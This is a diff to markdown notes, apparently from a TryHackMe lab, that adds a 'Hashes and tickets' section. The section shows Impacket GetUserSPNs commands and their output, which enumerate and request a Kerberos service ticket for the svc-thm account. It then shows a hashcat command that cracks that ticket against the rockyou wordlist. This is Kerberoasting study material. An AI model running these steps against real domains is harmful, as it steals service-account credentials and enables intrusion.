@@ -1,9 +1,29 @@
-# Other attacks
+# Hashes and tickets
 
-## Kerberoasting
+```text
+$ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
 
-## AS-REP roasting
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------------  -------  --------  --------------------------  ---------  ----------
+http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>     
 
-## SMB Relay attack
 
-## LLMNR/NBNS poisoning
+$ python3 /opt/impacket/examples/GetUserSPNs.py -dc-ip 10.10.74.3 THM.red/thm -request-user svc-thm  
+Impacket v0.10.1.dev1+20220720.103933.3c6713e3 - Copyright 2022 SecureAuth Corporation
+
+Password:
+ServicePrincipalName          Name     MemberOf  PasswordLastSet             LastLogon  Delegation 
+----------------------------  -------  --------  --------------------------  ---------  ----------
+http/creds-harvestin.thm.red  svc-thm            2022-06-10 10:47:33.796826  <never>               
+
+
+
+[-] CCache file is not found. Skipping... [ticket]
+```
+
+Hashcat:
+
+    $ hashcat -a 0 -m 13100 spn.hash /usr/share/wordlists/rockyou.txt
+
